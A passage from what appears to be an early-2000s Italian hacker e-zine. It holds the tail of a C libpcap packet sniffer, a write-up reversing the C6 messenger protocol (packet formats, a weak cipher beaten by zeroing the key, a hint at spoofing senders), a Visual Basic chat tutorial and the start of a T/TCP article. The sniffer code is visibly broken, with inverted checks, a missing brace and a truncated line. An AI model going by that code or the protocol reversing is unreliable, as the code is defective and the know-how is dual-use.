                                if (strcmp(optarg,"tcp") || strcmp(optarg, "udp") )
                                        {
                                        pProt = malloc(strlen(optarg));
                                        strncpy(pProt,optarg, strlen(optarg));
                                        }
                                else
                                        {
                                        usage(argv[0]);
                                        exit(0);
                                        }
                                break;
                        case 'h':
                                usage(argv[0]);
                                exit(0);
                                break;
                        default:
                                usage(argv[0]);
                                exit(0);
                                break;
                        }
                }
        if(!pcap_device)
                {
                usage(argv[0]);
                exit(0);
        printf("\n[*] ASS : Another Stupid Sniffer [*]\n");
        printf(" +< Device: %s\n", pcap_device);
        pcap_lookupnet(pcap_device , &netaddr , &netmask , errbuf);
        pcap_fd=pcap_open_live(pcap_device, BUFSIZ, 1, 0, errbuf);
        pcap_compile(pcap_fd, &filter, pProt, 0, netaddr);
        pcap_setfilter(pcap_fd, &filter);
        i=0;
        printf(" +< Start Sniffing...\n");
        while(1)
                {
                int offset, datalink;
                struct in_addr srcfd, dstfd;
                char ipsrc[16], ipdst[16];
                pcap_pkt = pcap_next(pcap_fd, &pcap_hdr);
                switch((datalink=pcap_datalink(pcap_fd)))
                        {
                        case DLT_EN10MB:
                                offset = 14;
                                break;
                        case DLT_NULL:
                        case DLT_PPP:
                                offset = 4;
                                break;
                        case DLT_SLIP:
                                offset = 16;
                                break;
                        case DLT_RAW:
                                offset = 0;
                                break;
                        case DLT_SLIP_BSDOS:
                        case DLT_PPP_BSDOS:
                                offset = 24;
                                break;
                        case DLT_PPP_ETHER:
                                printf("PPPoE Not Supported.\n");
                                exit(-1);
                        case 113: //con ppp0 mi dava Unknown Dadalink e l'ho trovato da solo il datalink =P
                                offset = 20;
                                break;
                        default:
                                printf("unknown datalink type (%d)\n", datalink);
                                exit(-1);
                        }
                ip= (struct iphdr *) (pcap_pkt + offset);
                srcfd.s_addr= ip->saddr;
                dstfd.s_addr= ip->daddr;
                printf("[%s]------(%s)------>[%s]\n", inet_ntop(AF_INET,&srcfd,ipsrc,sizeof(ipsrc)), pProt , inet_ntop(AF_INET,&src$
                //printf("PayLoad: \n%s\n",(u_char *) (pcap_pkt + sizeof(struct iphdr) + sizeof(struct tcphdr)));
                }
        pcap_close(pcap_fd);
        exit(0);
        }

void usage(char *bin)
        {
        printf("[*] ASS : Another Stupid Sniffer [*]\n");
        printf("Usage: %s -d <ethX/pppX> -p <tcp/udp>\n", bin);
        printf("Coder: ValK (valk@mojodo.it)\n");
        printf("Http: www.mojodo.it\n");
        }

------------------------------------<END>--------------------------------------


=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
-------------------------------------------------------------------------------
------------------------------------[MISC]-------------------------------------
-------------------------------------------------------------------------------
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=


-------------------------------------<17>--------------------------------------
-----------------------------------<BIGAlex>-----------------------------------
---------------------------------<Reverse C6>----------------------------------

           ----==[ Il protocollo C6!!!! ]==----

Chiunque voglia far parte dell'Open  C6 Project è il benvenuto. Il progetto si occupa di creare clients e servers C6 open
source e della massima  portabilità (creati in c/c++ o java).
Per maggiori informazioni, troverete tutto nella sezione progetti di www.redangel.it (al momento il link non è ancora attivo).


==-->
C6, Come sei?
        <--==


Questo testo è stato scritto per soli scopi educativi, non mi
assumo nessuna responsabilità  per usi illeciti di questo te-
sto. Inoltre  il reversing del c6  non è  reato in quanto non
essendoci alcun genere di  condizioni da accettare (e neppure
nella guida è scritto nulla a riguardo), è possibile disassemblare, crackare e fare il reversing di ogni parte del c6.
Tuttavia, il software è protetto da  copyright, quindi la copia è vietata.
Con questo sproloquio  non incito comunque nessuno a compiere
alcun genere di atto illegale.

Inoltre, ho fatto questo lavoro solo per utilizzare C6 in LAN
(usando un server locale) e sotto Linux (codandolo in C). Altri utilizzi  potrebbero essere illegali!
Altr  scopo  di questo  testo è mostrare  quante informazioni
vengono passate dal client al  server che  potrebbe benissimo
loggare  o 'attivarsi'  alla lettura  di determinate  parole,
proprio come fa Echelon. Con questo  non voglio assolutamente
insinuare che la tin ci spia e viola  la nostra privacy, anzi
già dal fatto che  non chieda molte  informazioni alla nostra
iscrizione si può  intuire che  io mi sbagli,  ma voglio solo
mostrarvi  le  informazioni passate  (nostre informazioni) al
server.

Finalmente il sogno di  tanti presunti hackers, crackers, re-
versers, coders e chi più  ne ha  più ne metta, si avvera.
Il protocollo di C6 è stato reversato  nelle sue funzioni più
importanti. Le funzioni ancora da reversare sono:

- Codifica iniziale
- Codifica della password
- Varie funzioni come ricerca di NetFriends e Canali.

Potrà sembrarvi molto il  lavoro ancora da fare,  ma invece è
abbastanza poco. La codifica del C6 è  del tipo cifrario di Ce-
sare, quindi  estremamente semplice da crackare. Per la codi-
fica della password per il momento non ho approfondito più di
tanto, poiché stavo pensando di aggirare il problema. Essendo
il protocollo ancora in  fase di  reversing, non  sono ancora
riuscito a reversarlo del tutto.

Volevo, prima di parlare del protocollo, esprimere alcune mie
idee: quanti di noi si definiscono hacker (dico noi nel senso
di 'noi che siamo nell'underground', dato  che io non lo fac-
cio) e alla fine non sanno  fare nulla?  Questo stesso proto-
collo l'ho reversato in soli DUE giorni:  una serata per eli-
minare la codifica ed un giorno per comprendere a fondo i co-
mandi qui analizzati.  Ne ho  sentite tante, ma davvero tante
sul C6  e voglio  farvi vedere  qualche esempio. Innanzitutto
per coloro  che sono soliti  frequentare l'ormai famoso news-
group free.it.hackers  (che mi  limito a leggere, dato che se
mando uno o due messaggi per criticare qualcosa, NON QUALCUNO
vengo assalito dai  branchi di lamers  che ormai con internet
gratuito aumentano sempre più) volevo segnalare ad esempio un
messaggio (scusate ma quando i nomi ci vogliono, ci vogliono:
che significato  avrebbe altrimenti  la sezione 'saluti' pre-
sente in  quasi tutti i tutorials?) di uno  che pensavo fosse
esperto: fdiskolo. Ricordo che tempo fa frequentava MHacker-
ONE, una crew che ha aiutato  molte persone a  crescere ed ad
accumulare    conoscenza.     Comunque,    prima   anche  lui
faceva parte di questo gruppo ed era uno di quelli che consi-
deravo 'esperti', magari  pensavo a  loro come degli hackers.
Ora che sono cresciuto però vedo  che non tutti sono riusciti
a fare quel che ho fatto io: accumulare sempre maggiore cono-
scenza, un pò quello che  noi definiamo 'etica hacker' e mol-
ti di quelli che erano i miei miti sono caduti.
Molti di loro sono rimasti legati alle conoscenze che avevano
e non hanno fatto nulla di più. Questo stesso fdiskolo ha af-
fermato che il c6 usa il protocollo SSL per codificare i dati
trasmessi. Tutto questo è falso e vi sarà mostrato di seguito
(seguire per credere :). Oltretutto basterebbe usare lo snif-
fer per notare che molti dei bytes di quando si invia un mes-
saggio  restano perfettamente uguali,  cambia veramente poco.
se si trattasse di SSL, cambierebbe completamente tutto senza
avere elementi logici di connessione (da un log ad un altro).
Continuando, tale  Marcuzzo,  sempre nello stesso thread dice
che il server  è blindatissimo e che conviene lasciar perdere
in partenza. Sempre continuando nello stesso thread, dopo che
fdiskolo ha detto che occorre il ciclope per crackare l'SSL e
che Steve dica che c'è bisogno di una  grande potenza di cal-
colo per utilizzare questo ciclope, fdiskolo afferma che è un
tool per il calcolo  distribuito. Più avanti  vedremo che per
reversare il c6 e creare un  server basta azzerare  la chiave
di codifica e per creare un client basta capire come funziona
l'algoritmo di codifica che  usa quella chiave. Se  il client
C6 ci mette praticamente niente per decodificare il testo co-
dificato, lo stesso potrà fare il  nostro. Per coloro che vo-
gliano approfondire garantisco io, l'algoritmo mi sembra mol-
to facile.
Passiamo  ora al  protocollo. Come ho  fatto a capire  che si
trattava di  cifrario di  cesare? Semplice, come ho già detto
se si usa  uno sniffer, un  cumulo di dati  (tra l'altro solo
quelli  client-server sono codificati)  sono uguali (inviando
due volte  un messaggio,  lo sniffing è  quasi identico!). Se
fosse SSL cambierebbe del  tutto, ed è proprio  questo che mi
ha spinto alla decodifica.
Come primo pacchetto, il server manda  al client la chiave di
codifica (e qui  c'è da dire che  c'è qualcuno di cui non ri-
cordo il nick che insisteva  dicendo che lui non avrebbe man-
dato  la chiave  di codifica al client,  ma invece è così) al
client. La chiave sono gli  ultimi 8 bytes. Azzerando questi,
cioè impostandoli come bytes 00 si otterrà il testo in chiaro
e, dato che così sarà più facile,  è proprio così che lavore-
remo. C'è poi da dire che tutte le comunicazioni client-serv.
cominciano con  l'hex 10, mentre il serv.-client inizierà con
20.  Al  terzo e  quarto byte troveremo quel  che è un valore
short che però non è  in little-endian (cioè al contrario, la
modalità usata dai programmatori esperti) come ci aspetterem-
mo.  Questo contatore  indica il numero  di pacchetti inviati
dal server al client; ce ne sarà anche uno  nei pacchetti in-
viati dal client al server. Il quinto ed  il sesto byte indi-
cano anche qui un valore  short non in  little-endian che in-
dica la lunghezza  del messaggio fino  alla fine (cominciando
dalla fine del valore). Ci  sono poi due  bytes hex e cioè 00
02 seguiti dalla lunghezza della chiave (sempre valori short)
seguiti  infine dalla  chiave, che noi  dovremo azzerare. Per
fare ciò dovremo creare il server e fargli inviare come chia-
ve 00 00 00 00 00 00 00 00. Fatto questo il client ci invierà
i dati riferiti al login (inutili qui  e poi vedremo perché).
Il pacchetto inizia con 10 0F, una stringa che sarà sempre u-
guale nelle stringhe inviate dal client. Vi è poi il contato-
re in short, i bytes alla fine  del pacchetto sempre in short
poi due bytes hex 10 01 che ci permetteranno di capire di che
comando si tratta. Continuando, ci sono poi i bytes 00 01 che
io ho collegato al fatto che si  tratti di un  solo username,
ma non ne vedo lo scopo. Vi è poi un secondo valore che indi-
ca i bytes alla fine  del pacchetto, sempre in short. Ora c'è
la  lunghezza dello  username in singolo  byte, seguito dallo
username. Alla fine di questo c'è la lunghezza della pass co-
dificata (e della quale per ora non conosco ancora l'algorit-
mo di decodifica). C'è poi la lunghezza  della 'verifica' se-
guita dalla verifica. La 'verifica' credo sia un combinamento
di pass e user dato che cambia sia  cambiando l'uno che l'al-
tro. Il pacchetto finisce con i bytes 01 0A 7F 00 00 01 00 14
A questo il server risponde, sia se è corretto o no, inviando
dei bytes nei quali comanda il client di collegarsi ad un al-
tro server. Ciò è probabilmente fatto per evitare problemi di
sovraffollamento. Questo redirecting funziona così:
Inizia con  i bytes 20 02, poi il valore del contatore sempre
in short. Segue la lunghezza del pacchetto fino  alla fine in
short. Ora il server ci comunica l'ip  e la  porta alla quale
dobbiamo collegarci. Il formato  dell'ip sarà ABCD da noi in-
terpretabile come A.B.C.D, seguito da due bytes 00 seguiti da
altri 2 bytes che definiscono la porta in short.
Essendo particolarmente intricato, faccio uno schema:

20 12 [CONTAT] [LUNGH FINE] 00 02 [LUNGH FINE] [CHIAVE]

Dove CONTAT è il  contatore LUNGH FINE  la lunghezza fino al-
la fine del pacchetto e la chiave la chiave di codifica.
Il pacchetto mandato dal client è:

10 0F [CONTAT] [LEN FINE] 10 01 00 01 [LEN FINE] [LEN USER]
-> [USER] [LEN PASS] [PASS] [LEN VERIF] [VERIF]

Dove LEN FINE  è la  lunghezza alla  fine, LEN USER è la lun-
ghezza dello username, PASS è la password in codifica e VERIF
è la verifica.
Il server replica con:

20 02 [CONTAT] [LEN FINE] [IP] 00 00 [PORTA]

Dove IP è  scritto  in  valori  del tipo  ABCD e  significano
A.B.C.D e PORTA è scritto in short.

Una volta  fatto ciò,  il client si scollega dal  server e si
ricollega  all'indirizzo indicatogli  dal server. Qui troverà
un altro server  c6 che  funzionerà come il  primo per quanto
riguarda i primi due pacchetti. Poi se il  login è errato in-
vierà questo pacchetto:
20 03 00 02 00 00
Facilmente è possibile intuire che  20 è  l'ID del server che
contrassegna  ogni suo messaggio, 03 è il comando  di errore,
i seguenti due bytes sono in  contatore e 00 00 sono bytes di
riempimento (almeno credo :P )

Nel caso in cui è corretto il server manda del codice, ancora
in fase di analisi, in  cui scrive il  messaggio di benvenuto
che compare in alto a  destra sulla finestra di  c6 e invia i
banners che il client mostrerà.

A  questo  punto  il client richiede  alcune informazioni sui
pulsanti, come ad esempio  'scarica l'agenda!'. Il codice per
la richiesta è 10 0F 00 02 00 08 10 0D 00 02 00 02 01 2A
Ancora possiamo notare i  primi due bytes,  sempre uguali, il
contatore, la  lunghezza alla fine  in short, 10 0D  che è il
cosiddetto ID del comando e vari altri  bytes che non mi sono
soffermato ad  interpretare (tanto la  stringa di richiesta è
sempre uguale!).

Il server risponde quindi con la stringa (in schema):
20 15 [CONTAT] [LEN FINE] [NUM PULS] [LUNGH TESTO] [TESTO]
-> [LUNGH LINK] [LINK] [...]

Oltre ai soliti bytes, troviamo num puls, un valore short che
indica al client il  numero di pulsanti  da inserire; abbiamo
poi  TESTO che  è il testo  del pulsante e poi  LINK che è il
link a cui punta quel pulsante. Nel caso in cui sia più di un
pulsante, la sequenza si ripete, partendo da lungh testo fino
a link, fino all'esaurimento dei pulsanti (e di noi ihhiih :)

Il client poi  invia la  sua userlist al  server che man mano
gli dirà gli utenti che si collegano e si scollegano. Inoltre
dopo aver mandato questa list,  il server ci dirà i nick col-
legati.
La stringa di richiesta è questa (sempre schema):

10 0F [CONT] [LEN FINE LISTA] 10 03 00 03 [LEN FINE LISTA]
-> [NUM NICK] [LEN NICK] [NICK] [...] 10 0F 00 04 00 07 10
-> 0A 00 04 00 01 64

Dove LEN FINE LISTA è la lunghezza  fino alla fine della lis-
ta (non del pacchetto), NUM NICK è  il numero di nick, NICK è
un nick. Il numero di nick è in short.
Vengono inviati  tante  volte  LEN  NICK e NICK quanti sono i
nick. Alla fine  il pacchetto  termina  con quei bytes  sopra
scritti.

Una volta richiesta la lista dei nick collegati, il server ci
risponderà  con quelli  attualmente collegati; il pacchetto è
questo:
20 06 [CONTAT] [LEN FINE] [NUM NICK] [LEN NICK] [NICK]

NUM  NICK è  ancora una volta  il numero di  nick scritti, in
short. LEN NICK e NICK vengono scritti tante volte quanti so-
no i nick da inviare.

Può capitare che a volte all'avvio di  c6 (qui si conclude il
login!) venga inviato anche il pacchetto che ci definisce di-
sponibili, solo per  i NetFriends  o Occupati. I pacchetti in
questione sono:
10 0F [CONT] [LEN FINE] 10 0A 00 04 00 01 [STATO]
Mettendo da parte i  bytes già  conosciuti, abbiamo STATO che
può assumere i seguenti valori:
64 -> Disponibile
68 -> Solo NetFriends
70 -> Occupato

Analizziamo l'ultimo comando che ho reversato per ora: i mes-
saggi.

Nell'invio di  messaggi ci  sono due comandi,  uno per quello
online ed uno  per i messaggi  verso utenti offline, (email).
La differenza tra  i due è minima: l'incremento di un valore.
Il pacchetto è così configurato:
10 0F [CONT] [LEN FINE] 10 [VAL] 00 05 [LEN FINE] [LEN SEND]
-> [SEND] 00 01 [LEN TO] [TO] [LEN FINE] [MESS]

VAL è un valore che cambia, è appunto quello che dicevo prima
che incrementa:
08 -> Messaggio online
09 -> Messaggio offline (email)

SEND è colui che  invia il messaggio (spoof? ^^), TO è il ri-
cevente e MESS è il messaggio (ma và? :)
Il valore 00 01  contenuto tra SEND e  LEN TO potrebbe essere
il numero di persone a cui mandare il messaggio...bisognereb-
be provare a vedere mettendo 02 e due nick cosa succede :)

Beh...se mandiamo il messaggio, dobbiamo certamente anche po-
terlo ricevere! :)

Per  quanto riguarda la  ricezione, questo è  lo schema di un
pacchetto inviatoci dal server:
20 0F [CONT] [LEN FINE] [LEN FROM] [FROM] [LEN TO] [TO] 02 00
-> [MESS]

Qui non c'è nulla da aggiungere...tutto chiaro no?



                     ----==[ Saluti ]==----

Un saluto a tutte le crew in cui sono  che non nomino per mo-
tivi di spazio. Un altro saluto a tutti coloro che hanno pro-
vato a crackare  C6 e non  ci sono  riusciti, ma comunque una
mano  potevano  pure darmela (non  ho  trovato nessuno che mi
aiutasse...ma ci  sono riuscito  anche  da solo). Entro breve
realizzerò un server dimostrativo in  Visual Basic, utilizza-
bile solo in LAN: altri usi potrebbero essere illegali.


==-->
Nota  per i  ragazzi (ragazzi?) di  Icona, la società  che ha
creato il motore di c6: sul vostro sito è scritto il seguente
testo.

"Icona ha fondato il supporto a  questo  scenario  la propria
strategia; noi crediamo nello sviluppo di soluzioni basate su
questa logica; e per  attuarla sfruttiamo a  pieno  la nostra
competenza nella progettazione  che ha consentito lo sviluppo
del framework OFS, asset aziendale e piattaforma cardine del-
le nostre principali soluzioni."

Beh...se voi sfruttate a pieno la  vostra competenza e create
un algoritmo che usa il cifrario di cesare e per il resto non
protetto, cioè create un codice che può essere reversato in 2
giorni, credo che tutto ciò non sia abbastanza. Oltretutto l'
OFS è il  vostro cardine, bucando quello  non credo di avervi
fatti contenti, ma  da nessuna parte ho  letto delle clausole
di accettazione del  servizio (neanche sul vostro sito) nelle
quali fosse  scritto che il  reversing è vietato, ed  è stato
proprio per questo che  ho reversato il protocollo. Credo che
sia ora di aggiornare il protocollo...il client Atlantide non
viene toccato da due anni...avete finito di ricevere i soldi?
Io credo che vi  convenga aggiornare tutti  i messengers dato
che sono tutti con lo stesso protocollo (cambierà poco) più o
meno, quindi mettete mano alle tastiere :)
Assolutamente nulla di personale,
                                                        <--==

Byezz
--
BiGAlex
E-Mail: totalmeltdown@libero.it
SiTE: http://www.forum-informatico.it


------------------------------------<END>--------------------------------------

-------------------------------------<18>--------------------------------------
-------------------------------<endsub & [Evil]>-------------------------------
-------------------------<VB Client-server application>------------------------


 Authors = endsub & [Evil]
 Tutorial = VB Client-server application
 Date : 04/06/2002


Ideazione, programmazione e sviluppo

- Introduzione
- Client
- Server

Un saluto a tutti coloro i quali hanno deciso di intraprendere la scrittura
di una applicazione C/S "client server" seguendo i criteri di scrittura VB,
per l'esattezza la nostra applicazione tratterà un minuto programma che
instaurando una connessione ip to ip permetterà di avviare una chat fra
i 2 utenti questo servirà principalmente per iniziare a comprendere le
routine di vb inerenti le lo scambio dati in vb "l'uso del santo socket!".
Per rendere il tutto più comprensibile faremo 2 programmi differenti
scindendo quindi l'articolo in 2 parti, la prima inerente la scrittura
del programma che fungerà da server, la seconda inerente la scrittura
del programma che fungerà da client "che avvierà la connessione al
server da noi codato"

:::::::S:E:R:V:E:R::::::::::::::::::::::::::::::::::::::::::

Iniziamo visualizzando il codice sorgente del nostro server di chat :

............................................................

>Private Sub cmdascolta_Click()
>If txtport.Text = "" Then
>MsgBox "Inserisci la porta sulla quale il server di chat deve essere messo in ascolto", vbCritical
>Else
>If txtnick.Text = "" Then
>MsgBox "Inserisci il tuo nickname", vbCritical
>Else
>ws.Close
>ws.LocalPort = txtport.Text
>ws.Listen
>txtchat.Text = "*** Il programma è in ascolto" & vbCrLf
>cmdascolta.Enabled = False
>cmddisconnetti.Enabled = True
>End If
>End If
>End Sub

>Private Sub cmddisconnetti_Click()
>txtchat.Text = txtchat.Text & "*** Connessione terminata"
>ws.Close
>cmdascolta.Enabled = True
>cmddisconnetti.Enabled = False
>End Sub

>Private Sub cmdsalva_Click()
>Open "c:\endsub chat " & Time & ".txt" For Append As #1
>Print #1, txtchat.Text
>Close #1
>MsgBox "Conversazione salvata." & vbCrLf & "Il file è situato in c:\endsub chat " & Time & ".txt", vbInformation
>End Sub

>Private Sub txtmsg_KeyPress(KeyAscii As Integer)
>If KeyAscii = 13 Then
>If ws.State <> sckConnected Then
> txtchat.Text = txtchat.Text & "*** Non è stata avviata alcuna connessione" & vbCrLf
> txtmsg.Text = ""
> Exit Sub
> End If
> txtchat.Text = txtchat.Text & "<" & txtnick.Text & ">" & txtmsg.Text & vbCrLf
> ws.SendData "<" & txtnick.Text & ">" & txtmsg.Text & vbCrLf
> txtmsg.Text = ""
> Else
> End If
>End Sub

>Private Sub txtport_KeyPress(KeyAscii As Integer)
>Key$ = Chr$(KeyAscii)
>If ((Key$ < "0" Or Key$ > "9") And (Key$ <> Chr$(8))) Then
> Beep
> KeyAscii = 0
>End If
>End Sub

>Private Sub ws_ConnectionRequest(ByVal requestID As Long)
>If (ws.State <> sckClosed) Then ws.Close
> ws.Accept requestID
> txtchat.Text = txtchat.Text & "*** Connessione stabilita con: " & ws.RemoteHostIP & vbCrLf
> MsgBox "Connessione stabilita con: " & ws.RemoteHostIP, vbInformation
>End Sub

>Private Sub ws_DataArrival(ByVal bytesTotal As Long)
> Dim DATI As String
> ws.GetData DATI
> Beep
> txtchat.Text = txtchat.Text & DATI & vbCrLf
>End Sub
.............................................................

Analizzando...

1) cmdascolta_Click

>Private Sub cmdascolta_Click()
>If txtport.Text = "" Then
>MsgBox "Inserisci la porta sulla quale il server di chat deve essere messo in ascolto", vbCritical
>Else
>If txtnick.Text = "" Then
>MsgBox "Inserisci il tuo nickname", vbCritical
>Else
>ws.LocalPort = txtport.Text
>ws.Listen
>txtchat.Text = "*** Il programma è in ascolto" & vbCrLf
>cmdascolta.Enabled = False
>cmddisconnetti.Enabled = True
>End If
>End If
>End Sub

Analizziamo ora la parte inerente l'evento click del cmdascolta
"ossia di cosa accade quando viene cliccato il command button
ascolta, come prima cosa abbiamo un controllo dei valori immessi,
infatti nel caso in cui il valore del nick o della porta di comunicazione
è (= "") "quindi non vi è stato scritto nulla, il programma darà una
msgbox di errore, notificando l'immissione del dato mancante

>MsgBox "Inserisci la porta sulla quale il server di chat deve essere messo in ascolto", vbCritical

oppure....

>MsgBox "Inserisci il tuo nickname", vbCritical

in seguito viene stabilita come porta locale la porta immessa nella
txtport, ed inseguito il comando listen che da l'imput al sock di mettersi
in ascolto, nello stesso momento verrà visualizzato anche il messaggio
"*** Il programma è in ascolto" nella txtchat, verrà disabilitato il cmdascolta
a differenza invece del cmddisconnetti che verrà abilitato per dare la
possibilità di chiudere la comunicazione chiudendo il sock tramite il
metodo close inerente il socket.

2) cmddisconnetti_Click

>Private Sub cmddisconnetti_Click()
>txtchat.Text = txtchat.Text & "*** Connessione terminata"
>ws.Close
>cmdascolta.Enabled = True
>cmddisconnetti.Enabled = False
>End Sub

Questo invece è quanto accade se avviene la pressione del cmddisconnetti,
verrà infatti visualizzato il messaggio "*** Connessione terminata" nella txtchat,
verrà chiuso il socket, e abilitato il cmdascolta a differenza del cmddisconnetti
il quale sarà disabilitato "ciò grazie alla proprietà enabled dell'oggetto".

3) cmdsalva_Click

>Private Sub cmdsalva_Click()
>Open "c:\endsub chat " & Time & ".txt" For Append As #1
>Print #1, txtchat.Text
>Close #1
>MsgBox "Conversazione salvata." & vbCrLf & "Il file è situato in c:\endsub chat " & Time & ".txt", vbInformation
>End Sub

Questa parte del codice riguarda invece l'evento cmdsalva_click
"pressione del cmdsalva" il quale ha lo scopo di salvare la comunicazione
della txtxhat su di un file txt, generato tramite l'evento "Open ("File") for append..."
seguito da una msgbox di notifica "File salvato in etc etc..."

4) txtmsg_KeyPress

>Private Sub txtmsg_KeyPress(KeyAscii As Integer)
>If KeyAscii = 13 Then
>If ws.State <> sckConnected Then
> txtchat.Text = txtchat.Text & "*** Non è stata avviata alcuna connessione" & vbCrLf
> txtmsg.Text = ""
> Exit Sub
> End If
> txtchat.Text = txtchat.Text & vbCrLf & "<" & txtnick.Text & "> " & txtmsg.Text
> ws.SendData "<" & txtnick.Text & "> " & txtmsg.Text & vbCrLf
> txtmsg.Text = ""
> Else
> End If
>End Sub

Esaminiamo adesso quanto accade nell'evento txtmsg_KeyPress, come
prima cosa avviene il controllo della pressione del tasto enter "il quale in
ascii ha come valore 13", infatti nel caso in cui venga premuto enter, se la
connessione non è ancora stabilita verrà visualizzato nella txtchat il
msg "*** Non è stata avviata alcuna connessione" con successiva
formattazione dei caratteri digitati nella txtmsg, nel caso in cui invece la
connessione sia stata stabilita si avrà la ripetizione del proprio messaggio
nella txtchat, seguito dall'invio del proprio msg tramite l'evento SendData
del sock presso il client a noi connesso, più la successiva formattazione
del testo digitato nella txtmsg.

5) txtport_KeyPress

>Private Sub txtport_KeyPress(KeyAscii As Integer)
>Key$ = Chr$(KeyAscii)
>If ((Key$ < "0" Or Key$ > "9") And (Key$ <> Chr$(8))) Then
> Beep
> KeyAscii = 0
>End If
>End Sub

Non credo che qui ci sia molto da spiegare in quanto abbiamo impiantato
questo codice nell'evento KeyPress della txtport per far si che nn possano
essere digitati caratteri diversi da 0 e 9 "possano erre digitati solo numeri"

6) ws_ConnectionRequest

>Private Sub ws_ConnectionRequest(ByVal requestID As Long)
>If (ws.State <> sckClosed) Then ws.Close
> ws.Accept requestID
> txtchat.Text = txtchat.Text & "*** Connessione stabilita con: " & ws.RemoteHostIP & vbCrLf
> MsgBox "Connessione stabilita con: " & ws.RemoteHostIP, vbInformation
>End Sub

Ciò è invece inerente la ricezione di richieste di connessione, in quanto
appunto il socket "ws" accetta la connessione, visualizza un msg nella
txtchat nel quale ci dice che la connessione è stata stabilita dicendoci
l'indirizzo Ip della persona a noi connessa tramite l'evento ws.RemoteHostIp
il quale identifica l'indirizzo dell'host remoto, ed infine una msgbox di notifica
simile al msg immesso nella txtchat.

7) ws_DataArrival

>Private Sub ws_DataArrival(ByVal bytesTotal As Long)
> Dim DATI As String
> ws.GetData DATI
> Beep
> txtchat.Text = txtchat.Text & DATI & vbCrLf
>End Sub

Infine abbiamo l'evento Data arrival del socket "Ricezione dati", qui infatti
viene dichiarata una variabile di tipo "string" che sta ad indicare i dati
ricevuti da remoto denominata "DATI", i quali appena ricevuti verranno
immessi nella txtchat preceduti da un "beep" che ha lo scopo di notifica
msg ricevuto


:::::::C:L:I:E:N:T::::::::::::::::::::::::::::::::::::::::::

Codice sorgente:

 Private Sub Command1_Click()
    ws.Connect txthost.Text, txtport.Text
 End Sub

 Private Sub txtmsg_KeyPress(KeyAscii As Integer)
    If KeyAscii = 13 Then
    If ws.State <> sckConnected Then
        txtchat.Text = txtchat.Text & "*** Non è stata avviata alcuna connessione" & vbCrLf
        txtmsg.Text = ""
    Exit Sub
    End If
    txtchat.Text = txtchat.Text & "<" & txtnick.Text & ">" & txtmsg.Text & vbCrLf
    ws.SendData "<" & txtnick.Text & ">" & txtmsg.Text & vbCrLf
    txtmsg.Text = ""
    Else
    End If
 End Sub

 Private Sub txtport_KeyPress(KeyAscii As Integer)
    Key$ = Chr$(KeyAscii)
    If ((Key$ < "0" Or Key$ > "9") And (Key$ < Chr$(8))) Then
       Beep
       KeyAscii = 0
    End If
 End Sub

 Private Sub cmdsalva_Click()
    Open "c:\endsub chat " & Time & ".txt" For Append As #1
    Print #1, txtchat.Text
    Close #1
    MsgBox "Conversazione salvata." & vbCrLf & "Il file è situato in c:\endsub chat " & _
    Time & ".txt", vbInformation
 End Sub

 Private Sub ws_DataArrival(ByVal bytesTotal As Long)
    Dim DATI As String
    ws.GetData DATI, vbString
    Beep
    txtchat.Text = txtchat.Text & DATI
 End Sub


Vi lascio solo il codice del client perchè le funzioni sono le stesse presenti
in quelle del server..


------------------------------------<END>--------------------------------------

-------------------------------------<19>--------------------------------------
---------------------------------<Cyberdude>-----------------------------------
-----------------------------------<T/TCP>-------------------------------------


                      ####
####################  #::#            ##
#::::::::::::::::::#   #::#        ###:#
#==================#   #==#       #====#
#######=====########X  #==#X    ###====####         #########       ####### ####
  XXXX#=====#XXXXXXXX   #==#X   #=========#       ##=========##     #=====##====###
  XXXX#-----#XXXXXXXX   #--#X   #---------#     ##-------------#    #-----#--------#
      #-----#X           #--#   ###----####     #----#####-----#    #------###-----##
      #,,,,,#X           #,,#X    #,,,,#XXXXX  #,,,,,#XXXX#######   #,,,,,#X  ##,,,,#
      #,,,,,#X           #,,#X    #,,,,#XXXXX  #,,,,#XXXXXXXXXXXX   #,,,,,#XXXX#,,,,#
      #.....#X            #..#    #....#XXXXX  #....#XXXX  XXXXXXX  #.....#XXXX#....#X
      #.....#X            #..#    #....##X     #.....#XX  #######   #......#X##.....#X
      #.....#X            #..#X   #.....###    #......####.....#    #.......#.......#XX
      #     #X            #  #X   #       #     ##           ##     #     #       ##XXX
      #######X             #  #    #### ###      X###### ####XXXXX  #     ####  ##XXXX
        XXXXXX             ####X    XXX#XXXXX     XXXXXX#XXXXXXXX   #     #XXX##XXXXXX
        XXXXXX                XX    XXXXXXXXX      XXXXXXXXXXXXXX   #     #XXXXXXXXXXX
        XXXXXX                XX     XXXXXXXX        XXXXXXXXXX     #     #X XXXXXXXX
                                                                      #######X
                                                                        XXXXXX
                                                                        XXXXXX

                                                                   By Cyberdude

(Non è mia abitudine lasciare questi mega ascii...ma questo era troppo fatto bene;) n.d.CH)

INTRODUZIONE

Salve a tutti, mi presento, io sono cyberdude e sono alle mie prime comparse in questa
crew (noflyzone) non sapendo cosa scrivere come tutorial di presentazione, ho chiesto
al mio amico Lordvicio, nonché membro della crew, di darmi una idea originale per scrivere
un tutorial... indovinate un pò cosa mi ha chiesto di scrivere? hihihi benissimo ci
siamo capiti mi ha chiesto di scrivere qualcosa sul protocollo t\tcp ! inutile dire che
dovrò partire da zero, visto il fatto che non so neanche cosa sia! naturalmente il
tempo di studiare ci sta! mano mano che imparo, scriverò ok?
Che dire oggi è finalmente sabato, con la testa sto gia in vacanza, manca poco alla fine
della scuola e io nella mia veranda con il sole caldo che mi riscalda, alle 3 del
pomeriggio appena finito di chattare inizio il mio studio di questo protocollo e se voi
adesso state leggendo questo tutorial significa che i miei studi sono andati a buon
fine :)
Allora siamo pronti ? iniziamo subito a studiare

T\TCP TUTORIAL
by Cyberdude

Allora ragazzi...come prima cosa dobbiamo prima capire cosa sia questo T\tcp e a cosa
serva ... T/TCP è una estensione sperimentale del protocollo TCP realizzata per
risolvere i problemi relativi ai protocolli di trasporto transazionali per lo stak
TCP/IP. TCP e UDP sono la scelta corrente disponibile per l'applicazioni transazionali.
Entrambi questi protocolli hanno vantaggi e svantaggi. TCP è affidabile ma
inefficiente per le transazioni, al contrario l'UDP è inaffidabile ma altamente
efficiente. T/TCP si pone fra questi due protocolli; proponendosi come alternativa per
certe applicazioni.Bene adesso che abbiamo capito un pò di cosa si tratta, descrivo
